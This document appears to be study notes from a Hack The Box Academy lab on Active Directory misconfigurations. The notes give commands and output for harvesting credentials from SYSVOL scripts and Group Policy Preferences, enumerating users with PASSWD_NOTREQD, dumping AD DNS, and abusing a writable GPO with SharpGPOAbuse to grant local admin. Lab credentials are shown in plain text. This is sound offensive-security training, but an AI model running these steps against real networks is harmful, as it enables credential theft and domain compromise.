# Miscellaneous Misconfigurations

## unattend.xml ([Answer Files](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs?view=windows-11))

```pwsh
PS C:\Users\htb-student> type C:\panther\unattend.xml
```

## SYSVOL

```pwsh
PS C:\Users\htb-student> type \\ACADEMY-EA-DC01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```

```vbscript title="Output" hl_lines="5-6"
On Error Resume Next
strComputer = "."

Set oShell = CreateObject("WScript.Shell")
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"

Set Arg = WScript.Arguments
If  Arg.Count > 0 Then
sPwd = Arg(0) 'Pass the password as parameter to the script
End if

'Get the administrator name
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set colItems = objWMIService.ExecQuery("Select * from Win32_UserAccount Where LocalAccount = True")
For Each objItem in colItems
    sidAdmin = objItem.SID
    if trim(right(sidAdmin, 3)="500") and trim(left(sidAdmin,9)="S-1-5-21-") then

        'Echo = echo & "Name: " & objItem.Name & vbcrlf
        'Echo = echo & "SID: " & sidAdmin
        sUser =  objItem.Name
        Set oUser = GetObject("WinNT://" & strComputer & "/" & sUser)

        ' Set the password
        oUser.SetPassword sPwd
        oUser.Setinfo

        exit for
    end if
Next
```

## [DNS Dump](https://github.com/dirkjanm/adidnsdump)

### Querying

```sh
htb-student@ea-attack01:~$ adidnsdump ldap://172.16.5.5 -u 'INLANEFREIGHT\forend' -p 'Klmcargo2' --resolve
```

```output title="Output"
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[-] Could not resolve node LOGISTICS (probably no A record assigned to name)
[-] Could not resolve node ACADEMY-EA-DC02.LOGISTICS (probably no A record assigned to name)
[+] Found 26 records
```

### Viewing the Records

```sh
htb-student@ea-attack01:~$ cat records.csv
```

```output title="Output"
type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::3c89:c29f:6cc5:126
AAAA,ForestDnsZones,dead:beef::aa
AAAA,ForestDnsZones,dead:beef::edc5:554d:6803:3a2
AAAA,ForestDnsZones,dead:beef::228
A,ForestDnsZones,10.129.202.235
A,ForestDnsZones,172.16.5.5
A,ForestDnsZones,172.16.5.240
AAAA,DomainDnsZones,dead:beef::3c89:c29f:6cc5:126
AAAA,DomainDnsZones,dead:beef::aa
A,DomainDnsZones,172.16.5.5
A,ACADEMY-EA-WS01,172.16.5.200
A,ACADEMY-EA-WEB01,172.16.5.125
A,ACADEMY-EA-MX01,172.16.5.50
A,ACADEMY-EA-MS01,172.16.5.25
A,ACADEMY-EA-FILE,172.16.5.130
?,ACADEMY-EA-DC02.LOGISTICS,?
A,academy-ea-dc01,172.16.5.5
A,ACADEMY-EA-DB01,172.16.5.150
A,ACADEMY-EA-CTX1,172.16.5.100
A,ACADEMY-EA-CA01,172.16.5.120
NS,_msdcs,academy-ea-dc01.inlanefreight.local.
AAAA,@,dead:beef::3c89:c29f:6cc5:126
AAAA,@,dead:beef::aa
NS,@,academy-ea-dc01.inlanefreight.local.
A,@,172.16.5.5
```

## Description Field (Computer)

```pwsh
PS C:\Users\htb-student> Get-WmiObject -Class Win32_OperatingSystem | Select-Object description
```

## Description Field

### Get-LocalUser

```pwsh
PS C:\Users\htb-student> Get-LocalUser
```

### PowerView

```pwsh
PS C:\Users\htb-student> Get-DomainUser -Properties samaccountname,description | ? {$_.description -ne $null}
```

### ActiveDirectory Module

```pwsh
PS C:\Users\htb-student> ActiveDirectory\Get-ADUser -LDAPFilter "(&(objectCategory=user)(description=*))" -Properties * | Select-Object samaccountname,description
```

## PASSWD_NOTREQD

### Using PowerView

```pwsh
PS C:\Users\htb-student> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

```output title="Output"
samaccountname                                                           useraccountcontrol
--------------                                                           ------------------
guest                  ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                  PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ygroce               PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
ehamilton                              PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                         ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                  PASSWD_NOTREQD, NORMAL_ACCOUNT
```

### Using Dsquery

```pwsh
PS C:\Users\htb-student> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))"
```

```output title="Output"
"CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

## Group Policy Preferences Passwords

### CrackMapExec

```sh
htb-student@ea-attack01:~$ crackmapexec smb 172.16.5.5 -u 'forend' -p 'Klmcargo2' -M gpp_pasword
```

### [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)

```pwsh
PS C:\Users\htb-student> Get-GPPPassword -Server INLANEFREIGHT.LOCAL
```

## Automatic Logon

### Using CrackMapExec

```sh
htb-student@ea-attack01:~$ crackmapexec smb 172.16.5.5 -u 'forend' -p 'Klmcargo2' -M gpp_autologin
```

```output title="Output" hl_lines="4 7-9"
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
```

### Using [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1)

```pwsh
PS C:\Users\htb-student> Get-GPPAutologon
```

```output title="Output"
UserNames   File                                                                                                                                       Passwords
---------   ----                                                                                                                                       ---------
{guarddesk} \\INLANEFREIGHT.LOCAL\SYSVOL\INLANEFREIGHT.LOCAL\Policies\{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}\Machine\Preferences\Registry\Registry.xml {ILFreightguardadmin!}
```

## GPO

### Enumeration

#### Get-DomainGPO

```pwsh
PS C:\Users\htb-student> Get-DomainGPO | Select-Object displayname
```

```output title="Output" hl_lines="13"
displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services
```

#### Get-GPO

```pwsh
PS C:\Users\htb-student> GroupPolicy\Get-GPO -All | Select-Object DisplayName
```

```output title="Output" hl_lines="9"
DisplayName
-----------
Certificate Services
Default Domain Policy
Disable NetBIOS
Disable Guest Account
AutoLogon
Default Domain Controllers Policy
Disconnect Idle RDP
Disallow LM Hash
Deny CMD Access
Block Removable Media
GuardAutoLogon
Service Accounts Password Policy
Logon Banner
Disable Forced Restarts
Deny Control Panel Access
```

### Rights of Domain Users over Objects

```pwsh
PS C:\Users\htb-student> $SID = ConvertTo-SID "Domain Users"
PS C:\Users\htb-student> Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $SID}
```

```output title="Output" hl_lines="1 3"
ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             :
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl, WriteOwner
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983095
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
AceType               : AccessAllowed
AceFlags              : ObjectInherit, ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit, ObjectInherit
PropagationFlags      : None
AuditFlags            : None
```

### GUID to DisplayName

```pwsh
PS C:\Users\htb-student> GroupPolicy\Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

```output title="Output" hl_lines="1"
DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 10/28/2021 3:34:07 PM
ModificationTime : 4/5/2022 6:54:25 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :
```

### [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

```pwsh
PS C:\Users\htb-student> C:\Tools\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount forend --GPOName "Disconnect Idle RDP"
```

```output title="Output" hl_lines="6"
[+] Domain = inlanefreight.local
[+] Domain Controller = ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[+] Distinguished Name = CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
[+] SID Value of forend = S-1-5-21-3842939050-3880317879-2865463114-5614
[+] GUID of "Disconnect Idle RDP" is: {7CA9C789-14CE-46E3-A722-83F4097AF532}
[+] Creating file \\inlanefreight.local\SysVol\inlanefreight.local\Policies\{7CA9C789-14CE-46E3-A722-83F4097AF532}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```
